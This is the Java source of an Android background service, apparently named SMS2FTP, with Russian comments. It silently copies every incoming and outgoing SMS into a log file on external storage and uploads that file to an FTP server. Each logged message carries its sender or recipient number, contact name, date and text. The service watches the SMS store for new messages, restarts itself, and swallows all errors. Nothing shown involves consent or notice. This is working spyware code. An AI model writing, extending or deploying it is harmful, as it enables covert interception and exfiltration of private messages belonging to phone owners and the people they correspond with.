package com.n1ck.SMS2FTP;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;

public class Tasks extends Service{


    SharedPreferences sf;
    Handler handler;
    private static final Uri STATUS_URI = Uri.parse("content://sms");

    private OutgoingSMS sentSMS = null;
    String internet="";
    Boolean mRunning;

    String MyPREFERENCES = "MyPrefs" ;

    public static final String incoming = "incoming";
    public static final String outgoing = "outgoing";

    @Override
    public void onCreate() {
        super.onCreate();

        //Инициализация переменных
        mRunning = false;
        handler=new Handler();
        internet = NetworkUtil.getConnectivityStatusString(getApplicationContext());
        sf= getApplicationContext().getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try{

            File dir = new File(Environment.getExternalStorageDirectory(), "/log/");
            if(!dir.exists()) {
                dir.mkdirs();
            }

            //Регистрируем обработчик базы исходящих сообщений
            if(sentSMS == null){
                sentSMS = new OutgoingSMS(new Handler(), getBaseContext());
                getBaseContext().getContentResolver().registerContentObserver(STATUS_URI, true, sentSMS);
            }

            //Провереям, были ли собраны существующие входящие сообщения, если нет собираем
            boolean in=false;
            if (sf.contains(incoming))
            {
                in= sf.getBoolean(incoming, false);

            }

            if (!in){
                handler.postDelayed(getIncomingSMS, 0);
            }

            //Провереям, были ли собраны существующие исходящие сообщения, если нет собираем

            boolean out=false;
            if (sf.contains(outgoing))
            {
                out= sf.getBoolean(outgoing, false);
            }

            if (!out){
                handler.postDelayed(getOutgoingSMS, 0);
            }
        }catch(Exception e){
        }
        return android.app.Service.START_STICKY;
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }
    //Метод для сбора существующих исходящих смс
    Runnable getOutgoingSMS = new Runnable() {

        public void run() {
            new Thread(new Runnable() {
                public void run() {

                    Uri uri = Uri.parse("content://sms/sent");
                    final List<DataArray> list = new ArrayList<DataArray>();
                    String[] proj = new String[] {"address", "body", "date" };
                    Cursor d = getContentResolver().query(uri, proj, null ,null,null);
                    d.moveToLast();
                    while  (d.moveToPrevious()  ) {


                        DataArray dataArray = new DataArray();

                        dataArray.setName(d.getString(d.getColumnIndexOrThrow(proj[0])));
                        dataArray.setName1(d.getString(d.getColumnIndexOrThrow(proj[1])));
                        dataArray.setName2(d.getString(d.getColumnIndexOrThrow(proj[2])));
                        list.add(dataArray);

                    }
                    d.close();

                    try{
                        AppendText append=new AppendText();
                        for (DataArray mf : list) {


                            String msg="SMS: " + append.convertDate(Long.valueOf(mf.getName2()))+ "; OUT; " +
                                    append.getContactName(getApplicationContext(),mf.getName()) + "; " + mf.getName() + "; " + mf.getName1() ;

                            //Добавляем СМС информацию к файлу

                            append.appendStringToFile(msg, "/log/log.txt");

                        }
                        //Редактируем SharedPreference сообщая о том, что сообщение было собранно
                        Editor editor = sf.edit();
                        editor.putBoolean(outgoing, true);
                        editor.commit();

                        if (internet=="1" || internet=="2"){
                            FTPConnect ftp=new FTPConnect();
                            ftp.connectToFTP(getApplicationContext(),"log.txt");

                        }

                    }catch(Exception e){
                    }
                }
            }).start();

        } 	};

    //Метод для сбора существующих входящих смс
    Runnable getIncomingSMS = new Runnable() {

        public void run() {
            new Thread(new Runnable() {
                public void run() {

                    Uri uri = Uri.parse("content://sms/inbox");
                    final List<DataArray> list = new ArrayList<DataArray>();
                    String[] proj = new String[] {"address", "body", "date" };
                    Cursor d = getContentResolver().query(uri, proj, null ,null,null);
                    d.moveToLast();
                    while (d.moveToPrevious() ) {
                        DataArray dataArray = new DataArray();

                        dataArray.setName(d.getString(d.getColumnIndexOrThrow(proj[0])));
                        dataArray.setName1(d.getString(d.getColumnIndexOrThrow(proj[1])));
                        dataArray.setName2(d.getString(d.getColumnIndexOrThrow(proj[2])));

                        list.add(dataArray);

                    }
                    d.close();

                    try{
                        AppendText append=new AppendText();

                        for (DataArray mf : list) {


                            String msg="SMS: " + append.convertDate(Long.valueOf(mf.getName2()))+ "; IN; " +
                                    append.getContactName(getApplicationContext(),mf.getName()) + "; " + mf.getName() + "; " + mf.getName1() ;

                            //Добавляем СМС информацию к файлу

                            append.appendStringToFile(msg, "/log/log.txt");

                        }

                        //Редактируем SharedPreference сообщая о том, что сообщение было собранно
                        Editor editor = sf.edit();
                        editor.putBoolean(incoming, true);
                        editor.commit();


                        if (internet=="1" || internet=="2"){

                            FTPConnect ftp=new FTPConnect();
                            ftp.connectToFTP(getApplicationContext(),"log.txt");

                        }

                    }catch(Exception e){
                    }
                }
            }).start();
        } 	};
}